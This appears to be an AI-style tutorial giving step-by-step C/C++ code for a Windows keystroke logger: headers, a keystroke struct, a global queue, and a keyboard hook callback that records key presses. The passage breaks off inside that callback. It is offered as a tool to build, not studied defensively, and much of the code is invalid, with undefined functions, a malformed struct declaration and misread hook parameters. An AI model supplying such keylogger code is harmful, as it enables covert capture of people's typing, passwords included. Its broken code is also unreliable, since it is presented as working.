To create a keystroke logging application on a Windows computer, follow these steps:

**Step-by-Step Explanation and Code**

1. **Include Necessary Headers:**
   - Include the Windows header files needed for keyboard hooks and threading.
   ```c
   #include <windows.h>
   #include <winuser.h>
   #include <iostream>
   #include <queue>
   #include <ctime>
   #include <fstream>
   ```

2. **Define Data Structures:**
   - Use a queue to store keystroke events for thread safety.
   ```c
   #define KEYSTROKE 256
   #define BUF_SIZE 1024
   #include <queue>
   using namespace std;

   struct Keystroke {
       unsigned long long timestamp;
       unsigned char key;
       bool isPressed;
       bool isReleased;
       bool isRepeat;
       bool isKeyDown;
       bool isKeyUp;
       bool modifiers; // Shift, Ctrl, Alt
   };
   ```

3. **Global Variables:**
   - Variables to control the hook and thread.
   ```c
   HANDLE g_hHook = NULL;
   HANDLE g_hThread = NULL;
   queue<Keystroke> keystroke_queue;
   bool bRunning = true;
   ```

4. **Keyboard Hook Function:**
   - Define a function to handle keyboard events.
   ```c
   LRESULT CALLBACK keyboardCallback(int nCode, UINT wParam, LPARAM lParam) {
       switch(wParam) {
           case WM_KEYDOWN:
               if (IsKeyDown(wParam)) {
                   struct keystate = GetKeyState(0);
                   struct keystroke ks;
                   ks.key = wParam;
                   ks.isPressed = true;
                   ks.isKeyDown = true;
                   ks.modifiers = (keystate&0x20) ? 1 : 0;
                   if (keystate & 0x40000000) { // Left Alt
                       ks.modifiers |= 1;
                   } else if (keystate & 0x20000000) { // Right Alt
                       ks.modifiers |= 2;
                   } else if (keystate & 0x10000000) { // Ctrl
                       ks.modifiers |= 4;
                   } else if (keystate & 0x02000000) { // Shift
                       ks.modifiers |= 8;
                   }
                   keystroke_queue.push(Keystroke(current_time, ks.key, true, false, true, false, ks.modifiers));
               }
               break;
           case WM_KEYUP:
               if (IsKeyUp(wParam)) {
                   struct keystate = GetKeyState(0);
                   struct keystroke ks;
                   ks.key = wParam;
                   ks.isPressed = false;
                   ks.isKeyDown = false;
